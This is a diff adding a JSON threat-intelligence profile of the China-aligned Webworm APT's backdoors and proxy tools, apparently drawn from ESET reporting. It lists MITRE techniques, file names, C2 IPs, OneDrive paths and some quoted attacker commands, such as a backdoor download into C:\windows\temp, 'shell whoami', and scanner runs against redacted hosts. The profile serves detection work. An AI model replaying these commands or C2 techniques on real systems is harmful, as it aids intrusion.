@@ -1,0 +1,447 @@
+{
+  "malware_family": "EchoCreep, GraphWorm, WormFrp, ChainWorm, SmuxProxy, WormSocket (Webworm toolset)",
+  "threat_actor": "Webworm (China-aligned APT; linked to SixLittleMonkeys and FishMonger)",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "Webworm is a China-aligned APT that has shifted from McRat/Trochilus backdoors to stealthy, chained proxy tooling and added two new backdoors in 2025: EchoCreep (Discord C&C) and GraphWorm (Microsoft Graph API/OneDrive C&C). The group stages tools in a forked WordPress GitHub repository and retrieves WormFrp configurations from a compromised Amazon S3 bucket, using open-source scanners (dirsearch, nuclei) for reconnaissance. This profile captures the backdoor command strings, proxy artifacts, and C2/proxy infrastructure reported by ESET.",
+  "mitre_techniques": [
+    "T1595.002",
+    "T1595.003",
+    "T1588.006",
+    "T1583.004",
+    "T1583.003",
+    "T1584.006",
+    "T1608.002",
+    "T1059.003",
+    "T1053.005",
+    "T1547.001",
+    "T1070.004",
+    "T1112",
+    "T1027.013",
+    "T1550.001",
+    "T1078.004",
+    "T1070.006",
+    "T1021.007",
+    "T1005",
+    "T1074.001",
+    "T1074.002",
+    "T1071.001",
+    "T1132.001",
+    "T1573.002",
+    "T1090.003",
+    "T1090.002",
+    "T1090.001",
+    "T1102.002",
+    "T1041",
+    "T1567.002"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "scheduled_task",
+      "value": "MicrosoftSSHUpdate",
+      "context": "Custom-created scheduled task under which EchoCreep is executed",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Up Success",
+      "context": "EchoCreep first-execution Discord message sent to a pre-existing channel",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 05 01 00 01 00 00 00 00 00 00 }",
+      "context": "ChainWorm byte sequence sent to source on exception before reconnecting",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "beacon_shell_output.txt",
+      "context": "GraphWorm writes shell command output to a temporary directory",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "config.dat",
+      "context": "GraphWorm upgrade command writes updated configuration to disk",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "alive.txt",
+      "context": "GraphWorm heartbeat command updates this file on a random delay",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "C2OverOneDrive_v0316.exe",
+      "context": "GraphWorm backdoor sample filename (detection Win32/Agent.VWD)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "SearchApp.exe",
+      "context": "EchoCreep Discord backdoor sample filename (WinGo/Agent.ZK)",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "MessengerClient.exe",
+      "context": "WormSocket proxy sample filename (MSIL/HackTool.Proxy.I)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ssh.exe",
+      "context": "WormFrp proxy tool sample filename (WinGo/HackTool.Proxy.AE)",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "svc.exe",
+      "context": "WormHole proxy tool sample filename (MSIL/HackTool.Proxy.H)",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "dsocks.exe",
+      "context": "SmuxProxy (custom iox with hardcoded IP) sample filename",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "vpnbridge_x64.exe",
+      "context": "Staged file in forked WordPress repository (wp-admin)",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "setting.conf",
+      "context": "Staged file in forked WordPress repository",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "--proxy",
+      "context": "WormSocket optional command line argument followed by basic-auth URI",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "keyExchange",
+      "context": "GraphWorm OneDrive command setting admin public key in memory",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "heartbeat",
+      "context": "GraphWorm command creating random delay before updating alive.txt",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "InitiateForwarderClientReq",
+      "context": "WormSocket message class type 1 for forwarder TCP client setup",
+      "specificity": "medium",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "SendDataMessage",
+      "context": "WormSocket message class type 3 sending base64 data over TCP client",
+      "specificity": "medium",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "CheckInMessage",
+      "context": "WormSocket message class type 4 assigning MessengerId",
+      "specificity": "medium",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "_1.sh",
+      "context": "LegalHackers SquirrelMail CVE-2017-7692 exploit script in nuclei directory",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "import_name",
+      "value": "CreateProcessW",
+      "context": "GraphWorm exec command spawns a new process",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "Run",
+      "context": "GraphWorm persists by making updates to registry Run keys",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "run C:\\tools\\se\\win64\\test.vbs",
+      "context": "Early EchoCreep Discord test command (file run instead of shell)",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "download https://github.com/fatedier/frp/releases/download/v0.56.0/frp_0.56.0_darwin_amd64.tar.gz C:\\windows\\temp\\123.tar.gz",
+      "context": "EchoCreep download command observed in decrypted Discord messages",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "shell whoami",
+      "context": "Example EchoCreep command decrypted from Discord C&C",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "dirsearch -u https://[REDACTED]/ -x 403,404,400,402,401,405,500,503",
+      "context": "Operator bash history entry; web directory brute forcing (host redacted in figure)",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "./nuclei --target https://[REDACTED]/home/",
+      "context": "Operator bash history entry; nuclei vulnerability scan (host redacted in figure)",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "wamanharipethe.s3.ap-south-1.amazonaws.com",
+      "context": "Compromised S3 bucket for WormFrp configurations and data exfiltration",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "whpjewellers.s3.amazonaws.com",
+      "context": "Possible original publicly accessible version of the compromised bucket",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.77.13.67",
+      "context": "WormSocket web socket server (Vultr Holdings, first seen 2025-04-07)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "64.176.85.158",
+      "context": "SmuxProxy server, previously hosted operator open directory (first seen 2025-06-28)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "104.243.23.43",
+      "context": "SmuxProxy server, IT7 Networks (first seen 2025-04-09)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "108.61.200.151",
+      "context": "WormFrp proxy server, Vultr (first seen 2025-04-10)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "144.168.60.233",
+      "context": "Reverse shell IP discovered on SmuxProxy server (first seen 2025-06-30)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://github.com/anjsdgasdf/WordPress",
+      "context": "Forked WordPress repository used as file stager, revealed in Discord messages",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://github.com/fatedier/frp/releases/download/v0.56.0/frp_0.56.0_darwin_amd64.tar.gz",
+      "context": "Legitimate frp release downloaded by operators via EchoCreep",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/createUploadSession",
+      "context": "Microsoft Graph API endpoint used by GraphWorm to upload large staged files",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/me/drive/root:/<onedrive_path>",
+      "context": "Format of GraphWorm OneDrive paths for command/file references",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/me/drive/root:/<uniqueid>/<filename>/:content",
+      "context": "Format of GraphWorm OneDrive download path",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/files",
+      "context": "Per-victim OneDrive subfolder for staged files",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/result",
+      "context": "Per-victim OneDrive subfolder for command results",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/job",
+      "context": "Per-victim OneDrive subfolder for operator-queued jobs",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe"
+  ]
+}
